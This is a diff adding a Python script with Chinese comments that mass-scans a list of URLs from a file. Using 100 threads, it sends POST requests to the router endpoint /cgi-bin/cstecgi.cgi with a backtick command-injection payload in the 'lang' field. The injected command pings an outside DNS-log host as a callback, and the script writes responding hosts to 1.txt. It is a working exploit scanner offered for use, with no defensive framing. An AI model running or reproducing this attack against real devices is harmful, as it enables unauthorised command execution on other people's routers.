@@ -1,0 +1,53 @@
+import urllib.request
+import urllib.parse
+import json
+import concurrent.futures
+
+
+#proxy_handler = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'})
+#opener = urllib.request.build_opener(proxy_handler)
+#urllib.request.install_opener(opener)
+
+def process_url(url):
+    full_url = url.strip() + '/cgi-bin/cstecgi.cgi'  # 添加路径
+    data = {"lang": "`ping uiaptq.dnslog.cn`", "topicurl": "setLanguageCfg"}  # POST请求的数据
+
+    try:
+        # 将请求数据转换为JSON字符串
+        json_data = json.dumps(data)
+
+        # 发送HTTP POST请求，设置超时时间为3秒
+        req = urllib.request.Request(full_url, data=json_data.encode('utf-8'), headers={'Content-Type': 'application/json'})
+        with urllib.request.urlopen(req, timeout=3) as response:
+            status_code = response.getcode()
+
+            # 如果响应码为200，返回URL
+            if status_code == 200:
+                return url
+            else:
+                print(f"请求失败：{full_url}，响应码：{status_code}")
+    except Exception as e:
+        print(f"请求出现异常：{full_url}，错误信息：{str(e)}")
+    return None
+
+# 打开urls.txt文件
+with open('urls.txt', 'r') as file:
+    urls = file.readlines()
+
+# 使用线程池处理URL列表
+with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+    # 提交URL处理任务给线程池
+    future_to_url = {executor.submit(process_url, url): url for url in urls}
+
+    # 遍历处理结果
+    with open('1.txt', 'w') as output_file:
+        for future in concurrent.futures.as_completed(future_to_url):
+            url = future_to_url[future]
+            try:
+                data = future.result()
+                if data:
+                    output_file.write(data + '\n')
+            except Exception as e:
+                print(f"处理URL时出现异常：{url}，错误信息：{str(e)}")
+
+print("任务完成！请查看1.txt文件。")
